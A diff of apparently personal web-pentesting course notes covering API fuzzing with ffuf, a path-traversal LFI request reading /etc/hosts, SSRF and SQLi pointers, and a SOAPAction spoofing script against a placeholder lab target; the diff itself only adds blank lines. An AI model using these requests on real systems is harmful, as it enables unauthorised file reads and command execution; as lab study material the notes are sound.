@@ -11,15 +11,25 @@ curl http://<TARGET IP>:3003/?id=1
 ```
 - If this works, create script and run to retrieve all information: [[1. Information Disclosure#Information Disclosure through Fuzzing]]
 3. If this doesn't work, test for SQLi through same `id` paramater: [[1. Information Disclosure#Information Disclosure through SQL Injection]]
+
+
 ### Fuzz for API endpoints:
 ```shell
 ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
 ```
+
+
+
 ### Check for LFI attack
 ```shell
 curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
 ```
+
+
+
 ## Testing for SSRF: [[5. Server-Side Request Forgery (SSRF)#Example Scenario]]
+
+
 # WSDL File Found
 ## Finding Vulnerable Functions
 ### If WSDL file runs commands
@@ -46,6 +56,10 @@ print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAP
 ```shell
 python3 client_soapaction_spoofing.py
 ```
+
+
+
+
 ### If we find a SOAPAction parameter that sends username/password
 1. Find a SOAPAction with username and password elements:
 ```xml
